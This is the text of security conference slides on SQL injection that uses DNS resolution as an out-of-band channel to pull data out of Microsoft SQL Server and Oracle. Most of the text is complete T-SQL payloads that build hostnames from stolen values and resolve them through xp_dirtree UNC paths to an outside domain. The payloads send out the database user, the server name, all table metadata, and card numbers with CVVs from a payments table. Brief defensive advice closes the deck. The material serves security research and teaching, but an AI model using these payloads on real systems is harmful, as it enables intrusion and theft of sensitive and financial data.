• Microsoft SQL Server and Oracle have 
stored procedures and functions that 
directly or indirectly do DNS-resolution
• Some of these functions are 
executable by the “public” user
• Some of them are not mentioned in  
hardening guides
DNS as OOB – channel
• Microsoft SQL Server
– A number of stored procedures accept UNC path-
names
– Pointing a UNC path to a fqdn results in DNS 
resolution
– This can be used to channel database information 
to an attacker
– Example of stored procedures 
• xp_dirtree, xp_fileexists, xp_getfiledetails, 
sp_add_jobstep, 
– BACKUP DATABASE could also be used ...
DNS as OOB – channel
• Oracle database server
– Oracle provides the package UTL_INADDR 
which does direct name resolution
– UTL_HTTP or UTL_TCP can be used even if 
outbound communication is restricted
• Other databases?
– Yes probably
DNS as OOB – channel
• When extracting information using 
DNS the host name holds our data
• This means that our hostname has to 
be built dynamically using table data
• This can be achieved by using one or 
more variables and database cursors
• Once the hostname is complete  
xp_dirtree is issued to send our data
Retrieving the db-user name
DECLARE @s varchar(1024);
SET @s = 'master..xp_dirtree ''\\' + 
user_name() + '.inj.cqure.net\x'''; 
exec(@s)
Retrieving the server name
DECLARE @s varchar(1024); 
SET @s = 'master..xp_dirtree ''\\' + 
CONVERT(varchar, 
SERVERPROPERTY('ServerName')) + 
'.inj.cqure.net\x''';
exec(@s)
DNS as OOB – challenges
• Challenges
– DNS records are cached (this is true for 
non-existent records as well)
– Length restrictions of FQDN and labels
– Some characters require conversion
• Solutions
– Resolve using low or zero TTL
– Add a unique value to all data retrieved
– Truncate/split values exceeding length
– Convert characters prior to resolution
Handling caching
• Caching can be handled by always resolving 
to an address using a low or zero TTL
• Adding a unique piece of information before 
the data also defeats caching
• MSSQL provides the CHECKSUM function
– “CHECKSUM computes a hash value, called the 
checksum, over its list of arguments.” 
– We feed the CHECKSUM function with the current 
time stamp (current_timestamp)
• The end result will look similar to
– 14889601-tabledata.zone.suffix
Handling caching – sample
DECLARE @s varchar(1024);
SET @s = 'master..xp_dirtree ''\\' + 
convert(varchar, 
checksum(current_timestamp)) + '-' + 
user_name() + '.inj.cqure.net\x''';
exec(@s)
Handling length limitations
• The following length restrictions exist 
according to RFC 1035
– Labels must be 63 characters or less
– FQDN must be 255 characters or less
• We need to slice and dice our data in 
order to fit these restrictions
• The goal is to split a string and send it 
over several consecutive DNS requests
Handling length limitations
• The proposed layout is as follows
0x--_
– data - is our dot delimited data 
– id - is an identification for our data
– part - is the actual part number
– maxparts is the total parts to expect
Handling length limitations
• By converting our data to hex we need 
not to worry about any odd characters
• This can be achieved by 
– First converting the data to binary
– Then using fn_varbintohexstr 
• The hex string then needs to be 
divided into adequate pieces
• Splitting is done using the SUBSTRING 
function
Handling length limitations
• We first split the data to blocks of 
suitable FQDN lengths
• Each block is then divided once more 
into appropriate label blocks
• The ID- and PART-information is 
tagged to the end of the resulting data
• Finally it's sent using xp_dirtree or 
equivalent
Handling length limitations
• The receiving part (dns-server) reverses 
the process and prints the data
• Using this strategy we need only to 
inject once to retrieve all table data
• The injected script does all the work of 
extracting, packaging and sending data
• Only the size of the variable receiving 
our injected data is the limit
Demonstration
Enumerating the db-user
CREATE TABLE #dbs( dbname sysname, dbsize nvarchar(13) null, owner sysname, dbid 
smallint, created nvarchar(11), dbdesc nvarchar(600) null, cmptlevel tinyint ); 
INSERT INTO #dbs EXEC sp_helpdb; CREATE TABLE #metadata( dbname varchar(255), 
tblname varchar(255), colname varchar(255), typename varchar(255), typelen int) 
DECLARE @dbname varchar(255) DECLARE _dbs CURSOR LOCAL FORWARD_ONLY READ_ONLY FOR 
SELECT dbname FROM #dbs WHERE dbname<>'master' AND dbname<>'tempdb' AND 
dbname<>'msdb' OPEN _dbs FETCH NEXT FROM _dbs INTO @dbname WHILE @@FETCH_STATUS = 0 
BEGIN DECLARE @tblname varchar(255) DECLARE @sql varchar(255) SELECT @sql = 'USE ' + 
@dbname + '; INSERT INTO #metadata SELECT ''' + @dbname + ''', so.name, sc.name, 
st.name, sc.length FROM sysobjects so, syscolumns sc, systypes st WHERE so.id = 
sc.id AND sc.xtype = st.xtype AND so.xtype=''U''' EXEC(@sql) FETCH NEXT FROM _dbs 
INTO @dbname END DECLARE @str varchar(8000) DECLARE @chunk varchar(80) DECLARE @file 
varchar(300) DECLARE @partno int DECLARE @offset int DECLARE @chunksize int DECLARE 
@temp varchar(1000) DECLARE @total int DECLARE @chunkid varchar(100) DECLARE 
@dicesize int DECLARE _descs CURSOR LOCAL FORWARD_ONLY READ_ONLY FOR SELECT 
CONVERT(char(20),dbname) + CONVERT(char(20),tblname) + CONVERT(char(20), colname) + 
CONVERT(char(20), typename) + CONVERT(varchar, typelen)+CHAR(10) FROM #metadata OPEN 
_descs FETCH NEXT FROM _descs INTO @str WHILE @@FETCH_STATUS = 0 BEGIN SET @partno = 
0 SET @chunksize = 40 SET @offset = 0 SET @dicesize = 20 SET @total = LEN(@str) / 
@chunksize IF ( @total % @chunksize > 0 ) SET @total = @total + 1 SET @chunkid = 
CONVERT( varchar, CHECKSUM(current_timestamp) ) WHILE (LEN(@str)>1) BEGIN SET @chunk 
= SUBSTRING(@str, 1, @chunksize) SET @str = SUBSTRING(@str, @chunksize + 1, 8000 ) 
SET @file = master.dbo.fn_varbintohexstr(CONVERT(varbinary(100), @chunk )) SET 
@offset = 0 SET @temp = '' WHILE( 1=1 ) BEGIN SET @temp = @temp + SUBSTRING( @file, 
@offset + 1, @dicesize ) SET @offset = @offset + @dicesize IF ( @offset > len(@file) 
) BREAK SET @temp = @temp + '.' END SET @file = 'exec master..xp_dirtree ''\\' + 
CONVERT(varchar, checksum(current_timestamp) ) + '-' + @temp + '-' + @chunkid + '-' 
+ convert(varchar, @partno) + '_' + convert(varchar,@total) + '.inj.cqure.net\x''' 
EXEC(@file) SET @partno=@partno + 1 END FETCH NEXT FROM _descs INTO @str END DROP 
TABLE #metadata DROP TABLE #dbs
Enumerating metadata
CREATE TABLE #dbs( dbname sysname, dbsize nvarchar(13) null, owner sysname, dbid 
smallint, created nvarchar(11), dbdesc nvarchar(600) null, cmptlevel tinyint ); 
INSERT INTO #dbs EXEC sp_helpdb; CREATE TABLE #metadata( dbname varchar(255), 
tblname varchar(255), colname varchar(255), typename varchar(255), typelen int) 
DECLARE @dbname varchar(255) DECLARE _dbs CURSOR LOCAL FORWARD_ONLY READ_ONLY FOR 
SELECT dbname FROM #dbs WHERE dbname<>'master' AND dbname<>'tempdb' AND 
dbname<>'msdb' OPEN _dbs FETCH NEXT FROM _dbs INTO @dbname WHILE @@FETCH_STATUS = 0 
BEGIN DECLARE @tblname varchar(255) DECLARE @sql varchar(255) SELECT @sql = 'USE ' + 
@dbname + '; INSERT INTO #metadata SELECT ''' + @dbname + ''', so.name, sc.name, 
st.name, sc.length FROM sysobjects so, syscolumns sc, systypes st WHERE so.id = 
sc.id AND sc.xtype = st.xtype AND so.xtype=''U''' EXEC(@sql) FETCH NEXT FROM _dbs 
INTO @dbname END DECLARE @str varchar(8000) DECLARE @chunk varchar(80) DECLARE @file 
varchar(300) DECLARE @partno int DECLARE @offset int DECLARE @chunksize int DECLARE 
@temp varchar(1000) DECLARE @total int DECLARE @chunkid varchar(100) DECLARE 
@dicesize int DECLARE _descs CURSOR LOCAL FORWARD_ONLY READ_ONLY FOR SELECT 
CONVERT(char(20),dbname) + CONVERT(char(20),tblname) + CONVERT(char(20), colname) + 
CONVERT(char(20), typename) + CONVERT(varchar, typelen)+CHAR(10) FROM #metadata OPEN 
_descs FETCH NEXT FROM _descs INTO @str WHILE @@FETCH_STATUS = 0 BEGIN SET @partno = 
0 SET @chunksize = 40 SET @offset = 0 SET @dicesize = 20 SET @total = LEN(@str) / 
@chunksize IF ( @total % @chunksize > 0 ) SET @total = @total + 1 SET @chunkid = 
CONVERT( varchar, CHECKSUM(current_timestamp) ) WHILE (LEN(@str)>1) BEGIN SET @chunk 
= SUBSTRING(@str, 1, @chunksize) SET @str = SUBSTRING(@str, @chunksize + 1, 8000 ) 
SET @file = master.dbo.fn_varbintohexstr(CONVERT(varbinary(100), @chunk )) SET 
@offset = 0 SET @temp = '' WHILE( 1=1 ) BEGIN SET @temp = @temp + SUBSTRING( @file, 
@offset + 1, @dicesize ) SET @offset = @offset + @dicesize IF ( @offset > len(@file) 
) BREAK SET @temp = @temp + '.' END SET @file = 'exec master..xp_dirtree ''\\' + 
CONVERT(varchar, checksum(current_timestamp) ) + '-' + @temp + '-' + @chunkid + '-' 
+ convert(varchar, @partno) + '_' + convert(varchar,@total) + '.inj.cqure.net\x''' 
EXEC(@file) SET @partno=@partno + 1 END FETCH NEXT FROM _descs INTO @str END DROP 
TABLE #metadata DROP TABLE #dbs
Enumerating table data
DECLARE @str varchar(8000) DECLARE @chunk varchar(80) DECLARE 
@file varchar(300) DECLARE @partno int DECLARE @offset int 
DECLARE @chunksize int DECLARE @temp varchar(1000) DECLARE 
@total int DECLARE @chunkid varchar(100) DECLARE @dicesize int  
DECLARE _descs CURSOR LOCAL FORWARD_ONLY READ_ONLY FOR SELECT 
convert(char(30),cardholder) + convert(char(15),cardtype) + 
convert(char(20),cardno) + cvv + CHAR(10) FROM payments OPEN 
_descs FETCH NEXT FROM _descs INTO @str  WHILE @@FETCH_STATUS = 
0 BEGIN SET @partno = 0 SET @chunksize = 40 SET @offset = 0 SET 
@dicesize = 20 SET @total = LEN(@str) / @chunksize IF ( @total % 
@chunksize > 0 ) SET @total = @total + 1  SET @chunkid = 
CONVERT( varchar, CHECKSUM(current_timestamp) )  WHILE 
(LEN(@str)>1) BEGIN SET @chunk = SUBSTRING(@str, 1, @chunksize)  
SET @str = SUBSTRING(@str, @chunksize + 1, 8000 )  SET @file = 
master.dbo.fn_varbintohexstr(CONVERT(varbinary(100), @chunk ))  
SET @offset = 0 SET @temp = ''  WHILE( 1=1 ) BEGIN SET @temp = 
@temp + SUBSTRING( @file, @offset + 1, @dicesize )  SET @offset 
= @offset + @dicesize  IF ( @offset > len(@file) ) BREAK  SET 
@temp = @temp + '.' END SET @file = 'exec master..xp_dirtree 
''\\' + CONVERT(varchar, checksum(current_timestamp) ) + '-' + 
@temp + '-' + @chunkid + '-' + convert(varchar, @partno) + '_' + 
convert(varchar,@total) + '.inj.cqure.net\x'''  EXEC(@file) SET 
@partno=@partno + 1 END FETCH NEXT FROM _descs INTO @str END --
Preventive measures
• Examples of preventive measures
– Write solid code
• Use parameterized SQL with query placeholders
• Never trust users to play nice
– HARDEN DATABASES
• Use many of the great free hardening templates, 
including the once made available by the vendor
• Restrict outgoing communication to the Internet from 
database servers
• Disable OPENROWSET functionality
• Disable DNS
– Practice the “principle of least privilege”
• Use functions/sp’s and revoke privileges from tables 
and views etc. etc.
Questions?
Patrik Karlsson
PI:EMAIL
PI:EMAIL